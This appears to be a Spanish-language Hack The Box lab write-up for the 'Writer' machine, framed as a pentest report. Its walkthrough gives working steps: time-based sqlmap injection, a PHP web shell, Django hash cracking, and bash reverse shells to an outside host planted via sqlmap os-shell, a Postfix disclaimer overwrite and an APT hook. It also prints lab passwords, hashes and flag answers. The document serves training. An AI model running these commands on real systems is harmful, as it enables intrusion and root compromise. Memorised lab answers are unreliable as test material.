# Informe Técnico de Seguridad Ofensiva: Writer

![Hack The Box](https://img.shields.io/badge/Platform-Hack%20The%20Box-green?style=for-the-badge&logo=hackthebox)
![Difficulty](https://img.shields.io/badge/Difficulty-Medium-yellow?style=for-the-badge)
![OS](https://img.shields.io/badge/OS-Linux-orange?style=for-the-badge)
![Standards](https://img.shields.io/badge/Methodology-OffSec%20%2F%20PTES-purple?style=for-the-badge)
![Auditor](https://img.shields.io/badge/Assessor-araizcorp%20Offensive%20Security-blue?style=for-the-badge)

**Evaluación de Seguridad Ofensiva y Penetration Testing** realizada sobre el entorno de laboratorio **Writer** de **Hack The Box**, siguiendo los estándares de ejecución metodológica **OffSec PEN-200 (OSCP)** y **PTES (Penetration Testing Execution Standard)**.

---

## 📑 1. Resumen Ejecutivo (Executive Summary)

* **Objetivo de la Evaluación:** Identificar, documentar y explotar debilidades de seguridad en el host objetivo para evaluar el impacto sobre la confidencialidad, integridad y disponibilidad del sistema.
* **Calificación de Riesgo:** `CRÍTICO` (Acceso no autenticado que deriva en compromiso completo de la máquina y obtención de máximos privilegios administrativos).
* **Vector de Acceso Inicial:** Explotación de servicio de red
* **Vector de Elevación de Privilegios:** Escalada local de privilegios
* **Estado Final:** Compromiso total del objetivo (`User Proof` y `Root/System Proof` obtenidas exitosamente).

### Ficha Técnica de la Evaluación

| Parámetro | Detalle Técnico |
| :--- | :--- |
| **Host Objetivo** | Writer |
| **Plataforma** | Hack The Box |
| **Sistema Operativo** | Linux |
| **Nivel de Dificultad** | Medium |
| **CVE(s) Involucrados** | N/A |
| **Vector de Entrada** | Explotación de servicio de red |
| **Mecanismo de Escalada** | Escalada local de privilegios |
| **Consultor / Auditor** | Pedro Araiz (`araizcorp`) |

---

## 🎯 2. Diagrama del Flujo de Compromiso (Attack Path)

```
[ Fase 1: Reconocimiento ]
         │
         ▼
[ Fase 2: Enumeración & Identificación de Vectores ]
         │─── Descubrimiento de servicios y análisis de superficie de ataque
         └─── Verificación de configuraciones erróneas y CVEs conocidos
         │
         ▼
[ Fase 3: Explotación Inicial (Foothold) ]
         │─── Ejecución del vector: Explotación de servicio de red
         └─── Establecimiento de Reverse Shell / Acceso de usuario
         │
         ▼
[ Fase 4: Escalada de Privilegios Local ]
         │─── Auditoría interna: Escalada local de privilegios
         └─── Elevación a privilegios de superusuario (root / SYSTEM)
         │
         ▼
[ Fase 5: Evidencia & Banderas ]
         └─── Captura de User Flag y Root Flag
```

---

## 🔬 3. Procedimiento Técnico y Evidencias Paso a Paso

**How many open TCP ports are listening on Writer?**

R:  4

![image.png](./images/step_01.png)

**What is the relative path on the webserver to the admin login form?**

R: /administrative

![image.png](./images/step_02.png)

**The administrative dashboard shows "page likes" from what social media site?**

R: facebook

![image.png](./images/step_03.png)

**What is the password hash of [admin@writer.htb](mailto:admin@writer.htb)?**

R: 118e48794631a9612484ca8b55f622d0

```jsx
sqlmap -r req --batch --dump
```

![image.png](./images/step_04.png)

**What user on Writer has the UID of 1000?**

R: kyle

```jsx
sqlmap -r req --privileges
```

![image.png](./images/step_05.png)

![image.png](./images/step_06.png)

**What port is the writer2_project site listening on (only on localhost)?**

R:  /var/www/writer.htb/writer.wsgi

![image.png](./images/step_07.png)

**There is an SSRF vulnerability in the main site. What must the URL end with to be processed?**

R: .jpg

**What is the kyle user's password for SMB on Writer?**

R: ToughPasswordToCrack

![image.png](./images/step_08.png)

**What is the name of the Python file on the writer2_project share that is editable by kyle?**

R: [views.py](http://views.py/)

![Captura de pantalla 2025-08-23 150919.png](./images/step_09.png)

![image.png](./images/step_10.png)

![image.png](./images/step_11.png)

![image.png](./images/step_12.png)

![image.png](./images/step_13.png)

**What user is the website running as?**

R: www-data

![image.png](./images/step_14.png)

connector = mysql.connector.connect(user='admin', password='ToughPasswordToCrack', host='127.0.0.1', database='writer')

**What is the kyle user's password for Writer?**

R: marcoantonio

![image.png](./images/step_15.png)

![image.png](./images/step_16.png)

![image.png](./images/step_17.png)

**Submit the flag located in the kyle user's home directory.**

R:  b71ab09c409142c4227c89665a84255a

![image.png](./images/step_18.png)

**There are two files in the filter group. One is named `disclaimer`. What is the full path to the other?**

R:  /var/spool/filter

![image.png](./images/step_19.png)

**What user is the `disclaimer` file executed as?**

R: john

![image.png](./images/step_20.png)

![image.png](./images/step_21.png)

![image.png](./images/step_22.png)

**What group is the john user in?**

R:  management

![image.png](./images/step_23.png)

**What is the full path of the directory that is writable by the management group?**

R: /etc/apt/apt.conf.d

![image.png](./images/step_24.png)

**Submit the flag located in the root user's home directory.**

R:  d263b345667caec6cec7d572544434c2

![Captura de pantalla 2025-08-23 163557.png](./images/step_25.png)

![image.png](./images/step_26.png)

![image.png](./images/step_27.png)

![image.png](./images/step_28.png)

![image.png](./images/step_29.png)

![image.png](./images/step_30.png)

> 
> 
> 
> ## 1) Recon
> 
> ```bash
> nmap -Pn -sC -sV -oN nmap.txt 10.10.11.101
> # Web expuesta, login; captura con Burp la petición y guárdala en "req"
> 
> ```
> 
> Opcionalmente fuzz:
> 
> ```bash
> ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
>      -u http://writer.htb/FUZZ -ic
> 
> ```
> 
> ---
> 
> ## 2) SQL injection (time-based) en `uname`
> 
> **Archivo `req`**: incluye método/URL/headers/body de la petición de login. Si hay sesión, añade la cookie **exacta** (ojo a mayúsculas):
> 
> ```
> Cookie: session=eyJ1c2VyIjoiYWRtaW4nIG9yICcxJz0nMS0tIC0ifQ....
> 
> ```
> 
> **Detección y estabilización:**
> 
> ```bash
> sqlmap -r req --cookie 'session=TU_COOKIE' \
>   --batch --risk=3 --level=5 --threads=1 --keep-alive \
>   --technique=T --time-sec=5 \
>   --answers="follow=Y,redirect=Y,resend=Y"
> 
> ```
> 
> **Problemas que viste aquí y solución:**
> 
> - Usar `SESSION=` (mayúsculas) → **no** es la cookie correcta → **usa `session=`**.
> - Rechazar 302/redirecciones → sqlmap **se atasca** → acepta `follow/resend`.
> - `time-based` siempre es lento → usa **threads=1** y ajusta **`-time-sec`** (2–5) estable.
> 
> ---
> 
> ## 3) Privilegios del usuario DB
> 
> ```bash
> sqlmap -r req --cookie 'session=TU_COOKIE' \
>   --batch --technique=T --time-sec=5 --threads=1 \
>   --privileges
> # Viste: privilege: FILE
> 
> ```
> 
> Tener `FILE` es lo que permite usar `LOAD_FILE()` y (a veces) `INTO OUTFILE` según `@@secure_file_priv`.
> 
> Comprobar política:
> 
> ```bash
> sqlmap -r req --cookie 'session=TU_COOKIE' --batch \
>   --technique=T --time-sec=3 \
>   --sql-query "SELECT @@secure_file_priv"
> 
> ```
> 
> ---
> 
> ## 4) La pregunta “UID 1000” **sin** leer todo `/etc/passwd`
> 
> Intentar `--file-read=/etc/passwd` con **time-based** te consumió horas. La solución es **extraer sólo los bytes mínimos**:
> 
> **Primero, verifica que puedes leer algo:**
> 
> ```bash
> sqlmap -r req --cookie 'session=TU_COOKIE' --batch \
>   --technique=T --time-sec=3 --threads=1 --no-cast --hex \
>   --sql-query "SELECT HEX(SUBSTRING(LOAD_FILE('/etc/passwd'),1,16))"
> # Debe devolver algo como 726F6F743A783A30 ("root:x:0")
> 
> ```
> 
> **Saca sólo el *username* con UID 1000 (rápido):**
> 
> ```bash
> sqlmap -r req --cookie 'session=TU_COOKIE' --batch \
>   --technique=T --time-sec=3 --threads=1 --no-cast --hex \
>   --sql-query "SELECT SUBSTRING_INDEX(
>                  SUBSTRING_INDEX(
>                    SUBSTRING(LOAD_FILE('/etc/passwd'),1,LOCATE(':1000:',LOAD_FILE('/etc/passwd'))),
>                  '\n',-1),
>               ':',1)"
> 
> ```
> 
> - Si sale vacío, prueba con `:1001:` (puede que el primer usuario real sea 1001):
> 
> ```bash
> --sql-query "SELECT SUBSTRING_INDEX(
>                SUBSTRING_INDEX(
>                  SUBSTRING(LOAD_FILE('/etc/passwd'),1,LOCATE(':1001:',LOAD_FILE('/etc/passwd'))),
>                '\n',-1),
>              ':',1)"
> 
> ```
> 
> **Por qué esto va rápido:** sqlmap sólo tiene que inferir **pocos caracteres** (el nombre), no miles.
> 
> ---
> 
> ## 5) Foothold (3 caminos, según entorno)
> 
> ### A) `-os-shell` de sqlmap
> 
> ```bash
> sqlmap -r req --cookie 'session=TU_COOKIE' --batch \
>   --technique=T --time-sec=3 --os-shell
> # Dentro:
> bash -c 'bash -i >& /dev/tcp/10.10.14.8/443 0>&1'
> 
> ```
> 
> ### B) Webshell con `-file-write` (si `secure_file_priv` lo permite)
> 
> ```bash
> echo '<?php system($_GET["c"]); ?>' > /tmp/s.php
> 
> sqlmap -r req --cookie 'session=TU_COOKIE' --batch \
>   --file-write=/tmp/s.php --file-dest=/var/www/html/s.php
> 
> # http://writer.htb/s.php?c=id
> 
> ```
> 
> ### C) Credenciales por hash (Django PBKDF2)
> 
> Si sacaste algo como `pbkdf2_sha256$...`:
> 
> ```bash
> printf 'user:pbkdf2_sha256$260000$SALT$HASH\n' > hashes.txt
> python3 /usr/share/john/django2john.py hashes.txt > jtr.txt
> john --wordlist=/usr/share/wordlists/rockyou.txt jtr.txt
> john --show jtr.txt
> 
> ```
> 
> **Error típico que tuviste:** “No password hashes loaded” → solucionado usando **`django2john.py`** y formato correcto.
> 
> **Estabiliza la TTY cuando tengas shell:**
> 
> ```bash
> python -c 'import pty; pty.spawn("/bin/bash")' 2>/dev/null || script -qc /bin/bash /dev/null
> stty rows 50 cols 150; export TERM=xterm
> 
> ```
> 
> ---
> 
> ## 6) Privesc fiable: grupo **filter** y Postfix **disclaimer**
> 
> Encuentra los ficheros del grupo:
> 
> ```bash
> find / -type f -group filter \
>   -not -path "/proc/*" -not -path "/sys/*" -not -path "/dev/*" \
>   -not -path "/run/*"  -not -path "/snap/*" -not -path "/var/lib/docker/*" \
>   -printf '%p\n' 2>/dev/null
> # Verás /etc/postfix/disclaimer y “el otro” del grupo.
> 
> ```
> 
> **Modificar `disclaimer`:**
> 
> Motivo: lo ejecuta Postfix como filtro; con `#!/bin/sh` suelen fallar payloads tipo `>&` y `/dev/tcp`. Cambiamos a `bash` y añadimos reverse.
> 
> ```bash
> cp /etc/postfix/disclaimer /tmp/disclaimer
> sed -i '1 s|/bin/sh|/bin/bash|' /tmp/disclaimer
> printf "\n# payload\bash -c 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' &\n" >> /tmp/disclaimer
> chmod +x /tmp/disclaimer
> 
> ```
> 
> **Listener:**
> 
> ```bash
> rlwrap nc -lvnp 4444
> 
> ```
> 
> **Reposición continua (por si el servicio lo restaura):**
> 
> ```bash
> while true; do
>   cp /tmp/disclaimer /etc/postfix/disclaimer 2>/dev/null
>   sleep 0.2
> done
> 
> ```
> 
> **Disparar el filtro:**
> 
> Haz que pase un correo por Postfix (registro, contacto, reset, o un envío local si existe `mail`). En cuanto se ejecute el filtro, **entra la reverse** (según cómo corra el filtro, normalmente te sube a privilegios altos).
> 
> ---
> 
> ## 7) Alternativa que probaste: **APT hook** (por qué no subió)
> 
> Intentaste:
> 
> ```bash
> # (versión inicial que fallaba)
> echo 'apt::Update::Pre-Invoke {"..."};' > /etc/apt/apt.conf.d/000-shell
> 
> ```
> 
> **Problemas concretos que te frenaron:**
> 
> 1. El archivo **no** era `.conf` y/o la clave es **`APT::...`** (mayúsculas).
> 2. APT **parsea todo** ese directorio: dejaste un binario (`pspy64`) ahí → `apt-config dump` daba **Syntax error**.
> 3. Aunque lo dejes perfecto, necesitas que **APT se ejecute como root** (timer o `pkcon refresh`). En esta box, **es probable que no corra** automáticamente → el hook nunca se dispara.
> 
> **Arreglo de sintaxis (aun así no garantiza ejecución):**
> 
> ```bash
> mv /etc/apt/apt.conf.d/pspy64 /tmp/pspy64   # quitar el binario de ahí
> 
> cat > /etc/apt/apt.conf.d/000-pwn.conf <<'EOF'
> APT::Update::Pre-Invoke {
>   "bash -c 'bash -i >& /dev/tcp/10.10.14.8/443 0>&1' &";
> };
> EOF
> 
> apt-config dump | grep -nA2 'APT::Update::Pre-Invoke'
> 
> ```
> 
> **Pero** si no hay `pkcon`/timers ni `sudo apt update`, **no** se ejecuta y no escala. Por eso en *Writer* es más fiable el camino **disclaimer**.
> 
> ---
> 
> ## 8) Flags
> 
> ```bash
> # con foothold
> cat /home/*/user.txt
> 
> # tras privesc
> cat /root/root.txt
> 
> ```
> 
> ---
> 
> ## Por qué te costó (y cómo lo solucionaste)
> 
> - **SQLi time-based**: inherentemente **lenta**. Intentar `/etc/passwd` completo te quemó horas. Solución: **query mínima** con `LOCATE(':1000:')` y `SUBSTRING_INDEX` para traer sólo el nombre → segundos.
> - **Cookies y 302**: usar `SESSION` en vez de `session` (case-sensitive) y negar redirects hizo que sqlmap “no avanzara”. Solución: cookie correcta + `-answers="follow=Y,redirect=Y,resend=Y"`.
> - **`LOAD_FILE()` nulo/ruidoso**: sin comprobar `@@secure_file_priv` o leer bytes pequeños, parecía que “no funcionaba”. Solución: primero lee 16 bytes en HEX para validar.
> - **John “No password hashes loaded”** con Django: John quiere su **formato**. Solución: `django2john.py` o usar Hashcat `m 10000`.
> - **APT hook**: directorio de conf con archivos no válidos (`pspy64`) rompía el parser; y aunque lo arregles, **no hay proceso root** que ejecute APT regularmente → no escala. Solución: abandonar ese vector aquí y usar **Postfix `disclaimer`** (que sí se ejecuta bajo el contexto correcto).
> - **`/bin/sh` vs `/bin/bash`**: tus payloads usan `>&` y `/dev/tcp` (bash). Con `sh` fallan. Solución: cambiar shebang a `#!/bin/bash`.
> 
> ---
> 
> ## Chuleta rápida de comandos
> 
> **sqlmap estable (time-based):**
> 
> ```bash
> sqlmap -r req --cookie 'session=TU_COOKIE' \
>   --batch --risk=3 --level=5 \
>   --technique=T --time-sec=3 --threads=1 --keep-alive \
>   --answers="follow=Y,redirect=Y,resend=Y"
> 
> ```
> 
> **Comprobar `FILE` y `secure_file_priv`:**
> 
> ```bash
> sqlmap ... --privileges
> sqlmap ... --sql-query "SELECT @@secure_file_priv"
> 
> ```
> 
> **Leer 16 bytes de `/etc/passwd`:**
> 
> ```bash
> sqlmap ... --no-cast --hex \
>   --sql-query "SELECT HEX(SUBSTRING(LOAD_FILE('/etc/passwd'),1,16))"
> 
> ```
> 
> **Sacar username UID 1000 (rápido):**
> 
> ```bash
> sqlmap ... --no-cast --hex \
>   --sql-query "SELECT SUBSTRING_INDEX(
>                  SUBSTRING_INDEX(
>                    SUBSTRING(LOAD_FILE('/etc/passwd'),1,LOCATE(':1000:',LOAD_FILE('/etc/passwd'))),
>                  '\n',-1),
>               ':',1)"
> 
> ```
> 
> **Privesc `disclaimer`:**
> 
> ```bash
> cp /etc/postfix/disclaimer /tmp/disclaimer
> sed -i '1 s|/bin/sh|/bin/bash|' /tmp/disclaimer
> printf "\nbash -c 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' &\n" >> /tmp/disclaimer
> chmod +x /tmp/disclaimer
> rlwrap nc -lvnp 4444
> while true; do cp /tmp/disclaimer /etc/postfix/disclaimer 2>/dev/null; sleep 0.2; done
> # luego fuerza el flujo de correo
> 
> ```
>

---

## 🛡️ 4. Plan de Remediación y Recomendaciones de Hardening

### Acciones Tácticas Inmediatas
1. **Aplicación de Parches y Actualización:** Actualizar todos los servicios obsoletos y aplicar los parches correspondientes a las vulnerabilidades documentadas (N/A).
2. **Revisión de Permisos Críticos:** Eliminar permisos SUID/sudo innecesarios y auditar listas de control de acceso (ACLs) en directorios y archivos sensibles.
3. **Cierre de Superficie de Exposición:** Configurar firewalls a nivel de host para denegar puertos de administración o de depuración que no deban estar expuestos públicamente.

### Acciones Estratégicas y de Arquitectura
1. **Principio de Mínimo Privilegio (PoLP):** Configurar servicios y aplicaciones para que se ejecuten bajo cuentas de servicio con privilegios limitados sin acceso a shells interactivas.
2. **Segmentación de Red:** Aislar componentes críticos y servidores de aplicaciones en VLANs dedicadas con inspección de tráfico Este-Oeste.
3. **Monitorización Continua y EDR:** Implementar reglas de detección basadas en comportamiento para identificar ejecuciones anómalas de comandos, spawning de shells y tráfico de red no autorizado.

---

## 📊 5. Mapeo con Matriz MITRE ATT&CK

| Táctica | ID de Técnica | Nombre de Técnica | Aplicación en el Ejercicio |
| :--- | :--- | :--- | :--- |
| **Reconnaissance** | `T1595.002` | Vulnerability Scanning | Detección automatizada y manual de servicios mediante escaneo de puertos |
| **Initial Access** | `T1190` | Exploit Public-Facing Application | Explotación de vulnerabilidad en servicio de red expuesto (Explotación de servicio de red) |
| **Execution** | `T1059` | Command and Scripting Interpreter | Spawning de reverse shell interactiva para control del endpoint |
| **Privilege Escalation** | `T1068 / T1548` | Abuse Elevation Mechanism / Exploitation | Elevación de privilegios hacia superusuario (Escalada local de privilegios) |

---

© 2026 **araizcorp** — Documentación técnica desarrollada para preparación y consultoría de certificaciones **OffSec** (OSCP, OSEP, OSWE).
